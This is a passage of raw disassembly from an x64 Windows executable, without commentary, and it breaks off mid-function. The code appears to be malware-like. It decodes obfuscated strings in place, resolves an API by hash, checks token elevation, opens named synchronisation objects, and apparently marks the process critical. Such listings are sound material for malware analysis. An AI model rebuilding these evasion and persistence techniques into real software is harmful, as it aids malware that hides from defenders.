   140003bf8:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140003bfd:	31 d2                	xor    %edx,%edx
   140003bff:	e8 c2 d9 ff ff       	call   0x1400015c6
   140003c04:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
   140003c0b:	48 81 c4 48 05 00 00 	add    $0x548,%rsp
   140003c12:	5b                   	pop    %rbx
   140003c13:	5d                   	pop    %rbp
   140003c14:	5f                   	pop    %rdi
   140003c15:	5e                   	pop    %rsi
   140003c16:	41 5c                	pop    %r12
   140003c18:	41 5d                	pop    %r13
   140003c1a:	41 5e                	pop    %r14
   140003c1c:	41 5f                	pop    %r15
   140003c1e:	c3                   	ret
   140003c1f:	cc                   	int3
   140003c20:	41 57                	push   %r15
   140003c22:	41 56                	push   %r14
   140003c24:	41 54                	push   %r12
   140003c26:	56                   	push   %rsi
   140003c27:	57                   	push   %rdi
   140003c28:	55                   	push   %rbp
   140003c29:	53                   	push   %rbx
   140003c2a:	48 83 ec 70          	sub    $0x70,%rsp
   140003c2e:	4c 89 ce             	mov    %r9,%rsi
   140003c31:	4c 89 c7             	mov    %r8,%rdi
   140003c34:	48 89 d3             	mov    %rdx,%rbx
   140003c37:	48 85 c9             	test   %rcx,%rcx
   140003c3a:	0f 84 91 00 00 00    	je     0x140003cd1
   140003c40:	49 89 ce             	mov    %rcx,%r14
   140003c43:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   140003c4a:	00 00 
   140003c4c:	e8 2f 63 00 00       	call   0x140009f80
   140003c51:	8d 0c 45 02 00 00 00 	lea    0x2(,%rax,2),%ecx
   140003c58:	01 c0                	add    %eax,%eax
   140003c5a:	66 89 4c 24 32       	mov    %cx,0x32(%rsp)
   140003c5f:	66 89 44 24 30       	mov    %ax,0x30(%rsp)
   140003c64:	4c 89 74 24 38       	mov    %r14,0x38(%rsp)
   140003c69:	0f 57 c0             	xorps  %xmm0,%xmm0
   140003c6c:	0f 29 44 24 40       	movaps %xmm0,0x40(%rsp)
   140003c71:	0f 29 44 24 50       	movaps %xmm0,0x50(%rsp)
   140003c76:	c7 44 24 40 30 00 00 	movl   $0x30,0x40(%rsp)
   140003c7d:	00 
   140003c7e:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   140003c83:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140003c88:	0f 29 44 24 60       	movaps %xmm0,0x60(%rsp)
   140003c8d:	48 c7 44 24 28 00 00 	movq   $0x0,0x28(%rsp)
   140003c94:	00 00 
   140003c96:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   140003c9b:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   140003ca0:	ba 01 00 1f 00       	mov    $0x1f0001,%edx
   140003ca5:	45 31 c9             	xor    %r9d,%r9d
   140003ca8:	e8 92 d8 ff ff       	call   0x14000153f
   140003cad:	89 c5                	mov    %eax,%ebp
   140003caf:	4c 8b 74 24 28       	mov    0x28(%rsp),%r14
   140003cb4:	4c 89 f1             	mov    %r14,%rcx
   140003cb7:	e8 a2 d7 ff ff       	call   0x14000145e
   140003cbc:	85 ed                	test   %ebp,%ebp
   140003cbe:	0f 88 b4 00 00 00    	js     0x140003d78
   140003cc4:	49 ff c6             	inc    %r14
   140003cc7:	49 83 fe 02          	cmp    $0x2,%r14
   140003ccb:	0f 82 a7 00 00 00    	jb     0x140003d78
   140003cd1:	4c 8b b4 24 e0 00 00 	mov    0xe0(%rsp),%r14
   140003cd8:	00 
   140003cd9:	4c 8b a4 24 d8 00 00 	mov    0xd8(%rsp),%r12
   140003ce0:	00 
   140003ce1:	4c 8b bc 24 d0 00 00 	mov    0xd0(%rsp),%r15
   140003ce8:	00 
   140003ce9:	4c 8d 44 24 28       	lea    0x28(%rsp),%r8
   140003cee:	48 89 d9             	mov    %rbx,%rcx
   140003cf1:	48 89 fa             	mov    %rdi,%rdx
   140003cf4:	e8 77 f2 ff ff       	call   0x140002f70
   140003cf9:	48 89 c7             	mov    %rax,%rdi
   140003cfc:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   140003d01:	48 89 f1             	mov    %rsi,%rcx
   140003d04:	4c 89 fa             	mov    %r15,%rdx
   140003d07:	4d 89 f0             	mov    %r14,%r8
   140003d0a:	49 89 c1             	mov    %rax,%r9
   140003d0d:	e8 9e fc ff ff       	call   0x1400039b0
   140003d12:	48 89 c6             	mov    %rax,%rsi
   140003d15:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   140003d1a:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140003d1f:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   140003d24:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140003d29:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   140003d2e:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140003d35:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   140003d3b:	e8 87 d7 ff ff       	call   0x1400014c7
   140003d40:	48 83 fe ff          	cmp    $0xffffffffffffffff,%rsi
   140003d44:	74 32                	je     0x140003d78
   140003d46:	80 bc 24 e8 00 00 00 	cmpb   $0x0,0xe8(%rsp)
   140003d4d:	00 
   140003d4e:	74 20                	je     0x140003d70
   140003d50:	c7 44 24 40 01 00 00 	movl   $0x1,0x40(%rsp)
   140003d57:	00 
   140003d58:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   140003d5d:	48 89 f1             	mov    %rsi,%rcx
   140003d60:	ba 1d 00 00 00       	mov    $0x1d,%edx
   140003d65:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   140003d6b:	e8 a3 d6 ff ff       	call   0x140001413
   140003d70:	48 89 f1             	mov    %rsi,%rcx
   140003d73:	e8 e6 d6 ff ff       	call   0x14000145e
   140003d78:	90                   	nop
   140003d79:	48 83 c4 70          	add    $0x70,%rsp
   140003d7d:	5b                   	pop    %rbx
   140003d7e:	5d                   	pop    %rbp
   140003d7f:	5f                   	pop    %rdi
   140003d80:	5e                   	pop    %rsi
   140003d81:	41 5c                	pop    %r12
   140003d83:	41 5e                	pop    %r14
   140003d85:	41 5f                	pop    %r15
   140003d87:	c3                   	ret
   140003d88:	cc                   	int3
   140003d89:	cc                   	int3
   140003d8a:	cc                   	int3
   140003d8b:	cc                   	int3
   140003d8c:	cc                   	int3
   140003d8d:	cc                   	int3
   140003d8e:	cc                   	int3
   140003d8f:	cc                   	int3
   140003d90:	55                   	push   %rbp
   140003d91:	41 57                	push   %r15
   140003d93:	41 56                	push   %r14
   140003d95:	41 55                	push   %r13
   140003d97:	41 54                	push   %r12
   140003d99:	56                   	push   %rsi
   140003d9a:	57                   	push   %rdi
   140003d9b:	53                   	push   %rbx
   140003d9c:	b8 e8 17 00 00       	mov    $0x17e8,%eax
   140003da1:	e8 ba e8 ff ff       	call   0x140002660
   140003da6:	48 29 c4             	sub    %rax,%rsp
   140003da9:	48 8d ac 24 80 00 00 	lea    0x80(%rsp),%rbp
   140003db0:	00 
   140003db1:	0f 29 b5 50 17 00 00 	movaps %xmm6,0x1750(%rbp)
   140003db8:	e8 03 d9 ff ff       	call   0x1400016c0
   140003dbd:	80 3d ad f4 2b 00 00 	cmpb   $0x0,0x2bf4ad(%rip)        # 0x1402c3271
   140003dc4:	0f 84 9d 32 00 00    	je     0x140007067
   140003dca:	80 3d 45 f6 2b 00 00 	cmpb   $0x0,0x2bf645(%rip)        # 0x1402c3416
   140003dd1:	0f 84 c9 00 00 00    	je     0x140003ea0
   140003dd7:	66 0f 6f 05 31 78 00 	movdqa 0x7831(%rip),%xmm0        # 0x14000b610
   140003dde:	00 
   140003ddf:	66 0f 6f 0d d9 f5 2b 	movdqa 0x2bf5d9(%rip),%xmm1        # 0x1402c33c0
   140003de6:	00 
   140003de7:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140003deb:	66 0f 6f 15 2d 78 00 	movdqa 0x782d(%rip),%xmm2        # 0x14000b620
   140003df2:	00 
   140003df3:	66 0f db ca          	pand   %xmm2,%xmm1
   140003df7:	66 0f 7f 0d c1 f5 2b 	movdqa %xmm1,0x2bf5c1(%rip)        # 0x1402c33c0
   140003dfe:	00 
   140003dff:	66 0f 6f 0d c9 f5 2b 	movdqa 0x2bf5c9(%rip),%xmm1        # 0x1402c33d0
   140003e06:	00 
   140003e07:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140003e0b:	66 0f db ca          	pand   %xmm2,%xmm1
   140003e0f:	66 0f 7f 0d b9 f5 2b 	movdqa %xmm1,0x2bf5b9(%rip)        # 0x1402c33d0
   140003e16:	00 
   140003e17:	66 0f 6f 0d c1 f5 2b 	movdqa 0x2bf5c1(%rip),%xmm1        # 0x1402c33e0
   140003e1e:	00 
   140003e1f:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140003e23:	66 0f db ca          	pand   %xmm2,%xmm1
   140003e27:	66 0f 7f 0d b1 f5 2b 	movdqa %xmm1,0x2bf5b1(%rip)        # 0x1402c33e0
   140003e2e:	00 
   140003e2f:	66 0f 6f 0d b9 f5 2b 	movdqa 0x2bf5b9(%rip),%xmm1        # 0x1402c33f0
   140003e36:	00 
   140003e37:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140003e3b:	66 0f db ca          	pand   %xmm2,%xmm1
   140003e3f:	66 0f 7f 0d a9 f5 2b 	movdqa %xmm1,0x2bf5a9(%rip)        # 0x1402c33f0
   140003e46:	00 
   140003e47:	66 0f fd 05 b1 f5 2b 	paddw  0x2bf5b1(%rip),%xmm0        # 0x1402c3400
   140003e4e:	00 
   140003e4f:	66 0f db c2          	pand   %xmm2,%xmm0
   140003e53:	66 0f 7f 05 a5 f5 2b 	movdqa %xmm0,0x2bf5a5(%rip)        # 0x1402c3400
   140003e5a:	00 
   140003e5b:	b8 cd 00 00 00       	mov    $0xcd,%eax
   140003e60:	8b 0d aa f5 2b 00    	mov    0x2bf5aa(%rip),%ecx        # 0x1402c3410
   140003e66:	01 c1                	add    %eax,%ecx
   140003e68:	0f b6 c9             	movzbl %cl,%ecx
   140003e6b:	66 89 0d 9e f5 2b 00 	mov    %cx,0x2bf59e(%rip)        # 0x1402c3410
   140003e72:	0f b7 0d 99 f5 2b 00 	movzwl 0x2bf599(%rip),%ecx        # 0x1402c3412
   140003e79:	81 c1 cd 00 00 00    	add    $0xcd,%ecx
   140003e7f:	0f b6 c9             	movzbl %cl,%ecx
   140003e82:	66 89 0d 89 f5 2b 00 	mov    %cx,0x2bf589(%rip)        # 0x1402c3412
   140003e89:	03 05 85 f5 2b 00    	add    0x2bf585(%rip),%eax        # 0x1402c3414
   140003e8f:	0f b6 c0             	movzbl %al,%eax
   140003e92:	66 89 05 7b f5 2b 00 	mov    %ax,0x2bf57b(%rip)        # 0x1402c3414
   140003e99:	c6 05 76 f5 2b 00 00 	movb   $0x0,0x2bf576(%rip)        # 0x1402c3416
   140003ea0:	48 c7 85 d0 16 00 00 	movq   $0x0,0x16d0(%rbp)
   140003ea7:	00 00 00 00 
   140003eab:	48 8d 35 0e f5 2b 00 	lea    0x2bf50e(%rip),%rsi        # 0x1402c33c0
   140003eb2:	48 89 f1             	mov    %rsi,%rcx
   140003eb5:	e8 c6 60 00 00       	call   0x140009f80
   140003eba:	8d 0c 45 02 00 00 00 	lea    0x2(,%rax,2),%ecx
   140003ec1:	01 c0                	add    %eax,%eax
   140003ec3:	66 89 8d d2 16 00 00 	mov    %cx,0x16d2(%rbp)
   140003eca:	66 89 85 d0 16 00 00 	mov    %ax,0x16d0(%rbp)
   140003ed1:	48 89 b5 d8 16 00 00 	mov    %rsi,0x16d8(%rbp)
   140003ed8:	c7 85 a0 16 00 00 30 	movl   $0x30,0x16a0(%rbp)
   140003edf:	00 00 00 
   140003ee2:	48 c7 85 a8 16 00 00 	movq   $0x0,0x16a8(%rbp)
   140003ee9:	00 00 00 00 
   140003eed:	c7 85 b8 16 00 00 00 	movl   $0x0,0x16b8(%rbp)
   140003ef4:	00 00 00 
   140003ef7:	48 8d 85 d0 16 00 00 	lea    0x16d0(%rbp),%rax
   140003efe:	48 89 85 b0 16 00 00 	mov    %rax,0x16b0(%rbp)
   140003f05:	66 0f ef c0          	pxor   %xmm0,%xmm0
   140003f09:	f3 0f 7f 85 c0 16 00 	movdqu %xmm0,0x16c0(%rbp)
   140003f10:	00 
   140003f11:	48 8d 8d 98 16 00 00 	lea    0x1698(%rbp),%rcx
   140003f18:	4c 8d 85 a0 16 00 00 	lea    0x16a0(%rbp),%r8
   140003f1f:	ba 01 00 1f 00       	mov    $0x1f0001,%edx
   140003f24:	41 b1 01             	mov    $0x1,%r9b
   140003f27:	e8 13 d6 ff ff       	call   0x14000153f
   140003f2c:	85 c0                	test   %eax,%eax
   140003f2e:	0f 88 16 31 00 00    	js     0x14000704a
   140003f34:	48 c7 85 50 10 00 00 	movq   $0x0,0x1050(%rbp)
   140003f3b:	00 00 00 00 
   140003f3f:	4c 8d 85 50 10 00 00 	lea    0x1050(%rbp),%r8
   140003f46:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140003f4d:	ba 08 00 00 00       	mov    $0x8,%edx
   140003f52:	e8 ac d5 ff ff       	call   0x140001503
   140003f57:	c7 85 60 12 00 00 00 	movl   $0x0,0x1260(%rbp)
   140003f5e:	00 00 00 
   140003f61:	48 8b 8d 50 10 00 00 	mov    0x1050(%rbp),%rcx
   140003f68:	48 85 c9             	test   %rcx,%rcx
   140003f6b:	74 40                	je     0x140003fad
   140003f6d:	48 8d 85 60 12 00 00 	lea    0x1260(%rbp),%rax
   140003f74:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003f79:	4c 8d 85 20 0a 00 00 	lea    0xa20(%rbp),%r8
   140003f80:	ba 14 00 00 00       	mov    $0x14,%edx
   140003f85:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   140003f8b:	e8 dc d5 ff ff       	call   0x14000156c
   140003f90:	85 c0                	test   %eax,%eax
   140003f92:	78 19                	js     0x140003fad
   140003f94:	48 8b 8d 50 10 00 00 	mov    0x1050(%rbp),%rcx
   140003f9b:	e8 be d4 ff ff       	call   0x14000145e
   140003fa0:	83 bd 20 0a 00 00 00 	cmpl   $0x0,0xa20(%rbp)
   140003fa7:	41 0f 95 c5          	setne  %r13b
   140003fab:	eb 03                	jmp    0x140003fb0
   140003fad:	45 31 ed             	xor    %r13d,%r13d
   140003fb0:	b9 f2 da b3 0d       	mov    $0xdb3daf2,%ecx
   140003fb5:	e8 86 5a 00 00       	call   0x140009a40
   140003fba:	89 c0                	mov    %eax,%eax
   140003fbc:	65 48 8b 18          	mov    %gs:(%rax),%rbx
   140003fc0:	48 8b 43 20          	mov    0x20(%rbx),%rax
   140003fc4:	48 8b b0 80 00 00 00 	mov    0x80(%rax),%rsi
   140003fcb:	48 8d bd 20 0a 00 00 	lea    0xa20(%rbp),%rdi
   140003fd2:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   140003fd8:	48 89 f9             	mov    %rdi,%rcx
   140003fdb:	31 d2                	xor    %edx,%edx
   140003fdd:	e8 7e 60 00 00       	call   0x14000a060
   140003fe2:	48 8b 43 20          	mov    0x20(%rbx),%rax
   140003fe6:	48 8b 50 68          	mov    0x68(%rax),%rdx
   140003fea:	48 89 f9             	mov    %rdi,%rcx
   140003fed:	e8 6e 5f 00 00       	call   0x140009f60
   140003ff2:	48 8d 8d 60 12 00 00 	lea    0x1260(%rbp),%rcx
   140003ff9:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   140003fff:	31 d2                	xor    %edx,%edx
   140004001:	e8 5a 60 00 00       	call   0x14000a060
   140004006:	80 3d 65 f2 2b 00 00 	cmpb   $0x0,0x2bf265(%rip)        # 0x1402c3272
   14000400d:	0f 84 d9 30 00 00    	je     0x1400070ec
   140004013:	80 3d 1e f4 2b 00 00 	cmpb   $0x0,0x2bf41e(%rip)        # 0x1402c3438
   14000401a:	74 47                	je     0x140004063
   14000401c:	66 0f 6f 05 fc f3 2b 	movdqa 0x2bf3fc(%rip),%xmm0        # 0x1402c3420
   140004023:	00 
   140004024:	66 0f fd 05 14 76 00 	paddw  0x7614(%rip),%xmm0        # 0x14000b640
   14000402b:	00 
   14000402c:	66 0f db 05 ec 75 00 	pand   0x75ec(%rip),%xmm0        # 0x14000b620
   140004033:	00 
   140004034:	66 0f 7f 05 e4 f3 2b 	movdqa %xmm0,0x2bf3e4(%rip)        # 0x1402c3420
   14000403b:	00 
   14000403c:	f3 0f 7e 05 ec f3 2b 	movq   0x2bf3ec(%rip),%xmm0        # 0x1402c3430
   140004043:	00 
   140004044:	66 0f fd 05 04 76 00 	paddw  0x7604(%rip),%xmm0        # 0x14000b650
   14000404b:	00 
   14000404c:	66 0f db 05 0c 76 00 	pand   0x760c(%rip),%xmm0        # 0x14000b660
   140004053:	00 
   140004054:	66 0f d6 05 d4 f3 2b 	movq   %xmm0,0x2bf3d4(%rip)        # 0x1402c3430
   14000405b:	00 
   14000405c:	c6 05 d5 f3 2b 00 00 	movb   $0x0,0x2bf3d5(%rip)        # 0x1402c3438
   140004063:	48 8d 0d b6 f3 2b 00 	lea    0x2bf3b6(%rip),%rcx        # 0x1402c3420
   14000406a:	e8 11 5f 00 00       	call   0x140009f80
   14000406f:	66 83 3e 00          	cmpw   $0x0,(%rsi)
   140004073:	74 49                	je     0x1400040be
   140004075:	49 89 c6             	mov    %rax,%r14
   140004078:	4c 8d 3d a1 f3 2b 00 	lea    0x2bf3a1(%rip),%r15        # 0x1402c3420
   14000407f:	31 db                	xor    %ebx,%ebx
   140004081:	49 89 f4             	mov    %rsi,%r12
   140004084:	66 66 66 2e 0f 1f 84 	data16 data16 cs nopw 0x0(%rax,%rax,1)
   14000408b:	00 00 00 00 00 
   140004090:	4c 89 e1             	mov    %r12,%rcx
   140004093:	4c 89 fa             	mov    %r15,%rdx
   140004096:	4d 89 f0             	mov    %r14,%r8
   140004099:	e8 72 5f 00 00       	call   0x14000a010
   14000409e:	85 c0                	test   %eax,%eax
   1400040a0:	0f 84 a6 03 00 00    	je     0x14000444c
   1400040a6:	4c 89 e1             	mov    %r12,%rcx
   1400040a9:	e8 d2 5e 00 00       	call   0x140009f80
   1400040ae:	66 41 83 7c 44 02 00 	cmpw   $0x0,0x2(%r12,%rax,2)
   1400040b5:	4d 8d 64 44 02       	lea    0x2(%r12,%rax,2),%r12
   1400040ba:	75 d4                	jne    0x140004090
   1400040bc:	eb 02                	jmp    0x1400040c0
   1400040be:	31 db                	xor    %ebx,%ebx
   1400040c0:	80 3d ac f1 2b 00 00 	cmpb   $0x0,0x2bf1ac(%rip)        # 0x1402c3273
   1400040c7:	0f 84 90 03 00 00    	je     0x14000445d
   1400040cd:	80 3d 80 f3 2b 00 00 	cmpb   $0x0,0x2bf380(%rip)        # 0x1402c3454
   1400040d4:	74 47                	je     0x14000411d
   1400040d6:	66 0f 6f 05 62 f3 2b 	movdqa 0x2bf362(%rip),%xmm0        # 0x1402c3440
   1400040dd:	00 
   1400040de:	66 0f fd 05 5a 75 00 	paddw  0x755a(%rip),%xmm0        # 0x14000b640
   1400040e5:	00 
   1400040e6:	66 0f db 05 32 75 00 	pand   0x7532(%rip),%xmm0        # 0x14000b620
   1400040ed:	00 
   1400040ee:	66 0f 7f 05 4a f3 2b 	movdqa %xmm0,0x2bf34a(%rip)        # 0x1402c3440
   1400040f5:	00 
   1400040f6:	66 0f 6f 05 52 f3 2b 	movdqa 0x2bf352(%rip),%xmm0        # 0x1402c3450
   1400040fd:	00 
   1400040fe:	66 0f fd 05 7a 75 00 	paddw  0x757a(%rip),%xmm0        # 0x14000b680
   140004105:	00 
   140004106:	66 0f db 05 82 75 00 	pand   0x7582(%rip),%xmm0        # 0x14000b690
   14000410d:	00 
   14000410e:	66 0f 7e 05 3a f3 2b 	movd   %xmm0,0x2bf33a(%rip)        # 0x1402c3450
   140004115:	00 
   140004116:	c6 05 37 f3 2b 00 00 	movb   $0x0,0x2bf337(%rip)        # 0x1402c3454
   14000411d:	4c 8d b5 60 12 00 00 	lea    0x1260(%rbp),%r14
   140004124:	4c 89 f1             	mov    %r14,%rcx
   140004127:	48 89 da             	mov    %rbx,%rdx
   14000412a:	e8 41 5e 00 00       	call   0x140009f70
   14000412f:	48 8d 15 0a f3 2b 00 	lea    0x2bf30a(%rip),%rdx        # 0x1402c3440
   140004136:	4c 89 f1             	mov    %r14,%rcx
   140004139:	e8 22 5e 00 00       	call   0x140009f60
   14000413e:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   140004142:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   140004148:	31 d2                	xor    %edx,%edx
   14000414a:	e8 11 5f 00 00       	call   0x14000a060
   14000414f:	80 3d 1e f1 2b 00 00 	cmpb   $0x0,0x2bf11e(%rip)        # 0x1402c3274
   140004156:	0f 84 dd 2f 00 00    	je     0x140007139
   14000415c:	80 3d 4b f3 2b 00 00 	cmpb   $0x0,0x2bf34b(%rip)        # 0x1402c34ae
   140004163:	0f 84 fb 00 00 00    	je     0x140004264
   140004169:	66 0f 6f 05 2f 75 00 	movdqa 0x752f(%rip),%xmm0        # 0x14000b6a0
   140004170:	00 
   140004171:	66 0f 6f 0d e7 f2 2b 	movdqa 0x2bf2e7(%rip),%xmm1        # 0x1402c3460
   140004178:	00 
   140004179:	66 0f fd c8          	paddw  %xmm0,%xmm1
   14000417d:	66 0f 6f 15 9b 74 00 	movdqa 0x749b(%rip),%xmm2        # 0x14000b620
   140004184:	00 
   140004185:	66 0f db ca          	pand   %xmm2,%xmm1
   140004189:	66 0f 7f 0d cf f2 2b 	movdqa %xmm1,0x2bf2cf(%rip)        # 0x1402c3460
   140004190:	00 
   140004191:	66 0f 6f 0d d7 f2 2b 	movdqa 0x2bf2d7(%rip),%xmm1        # 0x1402c3470
   140004198:	00 
   140004199:	66 0f fd c8          	paddw  %xmm0,%xmm1
   14000419d:	66 0f db ca          	pand   %xmm2,%xmm1
   1400041a1:	66 0f 7f 0d c7 f2 2b 	movdqa %xmm1,0x2bf2c7(%rip)        # 0x1402c3470
   1400041a8:	00 
   1400041a9:	66 0f 6f 0d cf f2 2b 	movdqa 0x2bf2cf(%rip),%xmm1        # 0x1402c3480
   1400041b0:	00 
   1400041b1:	66 0f fd c8          	paddw  %xmm0,%xmm1
   1400041b5:	66 0f db ca          	pand   %xmm2,%xmm1
   1400041b9:	66 0f 7f 0d bf f2 2b 	movdqa %xmm1,0x2bf2bf(%rip)        # 0x1402c3480
   1400041c0:	00 
   1400041c1:	66 0f fd 05 c7 f2 2b 	paddw  0x2bf2c7(%rip),%xmm0        # 0x1402c3490
   1400041c8:	00 
   1400041c9:	66 0f db c2          	pand   %xmm2,%xmm0
   1400041cd:	66 0f 7f 05 bb f2 2b 	movdqa %xmm0,0x2bf2bb(%rip)        # 0x1402c3490
   1400041d4:	00 
   1400041d5:	8b 05 c5 f2 2b 00    	mov    0x2bf2c5(%rip),%eax        # 0x1402c34a0
   1400041db:	83 c0 43             	add    $0x43,%eax
   1400041de:	0f b6 c0             	movzbl %al,%eax
   1400041e1:	66 89 05 b8 f2 2b 00 	mov    %ax,0x2bf2b8(%rip)        # 0x1402c34a0
   1400041e8:	0f b7 05 b3 f2 2b 00 	movzwl 0x2bf2b3(%rip),%eax        # 0x1402c34a2
   1400041ef:	83 c0 43             	add    $0x43,%eax
   1400041f2:	0f b6 c0             	movzbl %al,%eax
   1400041f5:	66 89 05 a6 f2 2b 00 	mov    %ax,0x2bf2a6(%rip)        # 0x1402c34a2
   1400041fc:	8b 05 a2 f2 2b 00    	mov    0x2bf2a2(%rip),%eax        # 0x1402c34a4
   140004202:	83 c0 43             	add    $0x43,%eax
   140004205:	0f b6 c0             	movzbl %al,%eax
   140004208:	66 89 05 95 f2 2b 00 	mov    %ax,0x2bf295(%rip)        # 0x1402c34a4
   14000420f:	0f b7 05 90 f2 2b 00 	movzwl 0x2bf290(%rip),%eax        # 0x1402c34a6
   140004216:	83 c0 43             	add    $0x43,%eax
   140004219:	0f b6 c0             	movzbl %al,%eax
   14000421c:	66 89 05 83 f2 2b 00 	mov    %ax,0x2bf283(%rip)        # 0x1402c34a6
   140004223:	8b 05 7f f2 2b 00    	mov    0x2bf27f(%rip),%eax        # 0x1402c34a8
   140004229:	83 c0 43             	add    $0x43,%eax
   14000422c:	0f b6 c0             	movzbl %al,%eax
   14000422f:	66 89 05 72 f2 2b 00 	mov    %ax,0x2bf272(%rip)        # 0x1402c34a8
   140004236:	0f b7 05 6d f2 2b 00 	movzwl 0x2bf26d(%rip),%eax        # 0x1402c34aa
   14000423d:	83 c0 43             	add    $0x43,%eax
   140004240:	0f b6 c0             	movzbl %al,%eax
   140004243:	66 89 05 60 f2 2b 00 	mov    %ax,0x2bf260(%rip)        # 0x1402c34aa
   14000424a:	8b 05 5c f2 2b 00    	mov    0x2bf25c(%rip),%eax        # 0x1402c34ac
   140004250:	83 c0 43             	add    $0x43,%eax
   140004253:	0f b6 c0             	movzbl %al,%eax
   140004256:	66 89 05 4f f2 2b 00 	mov    %ax,0x2bf24f(%rip)        # 0x1402c34ac
   14000425d:	c6 05 4a f2 2b 00 00 	movb   $0x0,0x2bf24a(%rip)        # 0x1402c34ae
   140004264:	4c 8d 75 d0          	lea    -0x30(%rbp),%r14
   140004268:	48 8d 95 60 12 00 00 	lea    0x1260(%rbp),%rdx
   14000426f:	4c 89 f1             	mov    %r14,%rcx
   140004272:	e8 f9 5c 00 00       	call   0x140009f70
   140004277:	48 8d 15 e2 f1 2b 00 	lea    0x2bf1e2(%rip),%rdx        # 0x1402c3460
   14000427e:	4c 89 f1             	mov    %r14,%rcx
   140004281:	e8 da 5c 00 00       	call   0x140009f60
   140004286:	45 84 ed             	test   %r13b,%r13b
   140004289:	0f 84 e2 00 00 00    	je     0x140004371
   14000428f:	48 8d 8d 30 0c 00 00 	lea    0xc30(%rbp),%rcx
   140004296:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   14000429c:	31 d2                	xor    %edx,%edx
   14000429e:	e8 bd 5d 00 00       	call   0x14000a060
   1400042a3:	80 3d cc ef 2b 00 00 	cmpb   $0x0,0x2befcc(%rip)        # 0x1402c3276
   1400042aa:	0f 84 fd 2e 00 00    	je     0x1400071ad
   1400042b0:	80 3d 63 f2 2b 00 00 	cmpb   $0x0,0x2bf263(%rip)        # 0x1402c351a
   1400042b7:	74 5c                	je     0x140004315
   1400042b9:	66 0f 6f 05 3f f2 2b 	movdqa 0x2bf23f(%rip),%xmm0        # 0x1402c3500
   1400042c0:	00 
   1400042c1:	66 0f fd 05 07 74 00 	paddw  0x7407(%rip),%xmm0        # 0x14000b6d0
   1400042c8:	00 
   1400042c9:	66 0f db 05 4f 73 00 	pand   0x734f(%rip),%xmm0        # 0x14000b620
   1400042d0:	00 
   1400042d1:	66 0f 7f 05 27 f2 2b 	movdqa %xmm0,0x2bf227(%rip)        # 0x1402c3500
   1400042d8:	00 
   1400042d9:	f3 0f 7e 05 2f f2 2b 	movq   0x2bf22f(%rip),%xmm0        # 0x1402c3510
   1400042e0:	00 
   1400042e1:	66 0f fd 05 f7 73 00 	paddw  0x73f7(%rip),%xmm0        # 0x14000b6e0
   1400042e8:	00 
   1400042e9:	66 0f db 05 6f 73 00 	pand   0x736f(%rip),%xmm0        # 0x14000b660
   1400042f0:	00 
   1400042f1:	66 0f d6 05 17 f2 2b 	movq   %xmm0,0x2bf217(%rip)        # 0x1402c3510
   1400042f8:	00 
   1400042f9:	b8 c9 00 00 00       	mov    $0xc9,%eax
   1400042fe:	03 05 14 f2 2b 00    	add    0x2bf214(%rip),%eax        # 0x1402c3518
   140004304:	0f b6 c0             	movzbl %al,%eax
   140004307:	66 89 05 0a f2 2b 00 	mov    %ax,0x2bf20a(%rip)        # 0x1402c3518
   14000430e:	c6 05 05 f2 2b 00 00 	movb   $0x0,0x2bf205(%rip)        # 0x1402c351a
   140004315:	48 8d 0d e4 f1 2b 00 	lea    0x2bf1e4(%rip),%rcx        # 0x1402c3500
   14000431c:	e8 5f 5c 00 00       	call   0x140009f80
   140004321:	66 83 3e 00          	cmpw   $0x0,(%rsi)
   140004325:	0f 84 78 01 00 00    	je     0x1400044a3
   14000432b:	48 89 c3             	mov    %rax,%rbx
   14000432e:	4c 8d 3d cb f1 2b 00 	lea    0x2bf1cb(%rip),%r15        # 0x1402c3500
   140004335:	31 ff                	xor    %edi,%edi
   140004337:	49 89 f4             	mov    %rsi,%r12
   14000433a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140004340:	4c 89 e1             	mov    %r12,%rcx
   140004343:	4c 89 fa             	mov    %r15,%rdx
   140004346:	49 89 d8             	mov    %rbx,%r8
   140004349:	e8 c2 5c 00 00       	call   0x14000a010
   14000434e:	85 c0                	test   %eax,%eax
   140004350:	0f 84 51 01 00 00    	je     0x1400044a7
   140004356:	4c 89 e1             	mov    %r12,%rcx
   140004359:	e8 22 5c 00 00       	call   0x140009f80
   14000435e:	66 41 83 7c 44 02 00 	cmpw   $0x0,0x2(%r12,%rax,2)
   140004365:	4d 8d 64 44 02       	lea    0x2(%r12,%rax,2),%r12
   14000436a:	75 d4                	jne    0x140004340
   14000436c:	e9 3a 01 00 00       	jmp    0x1400044ab
   140004371:	80 3d fd ee 2b 00 00 	cmpb   $0x0,0x2beefd(%rip)        # 0x1402c3275
   140004378:	0f 84 85 2e 00 00    	je     0x140007203
   14000437e:	80 3d 6f f1 2b 00 00 	cmpb   $0x0,0x2bf16f(%rip)        # 0x1402c34f4
   140004385:	0f 84 9a 00 00 00    	je     0x140004425
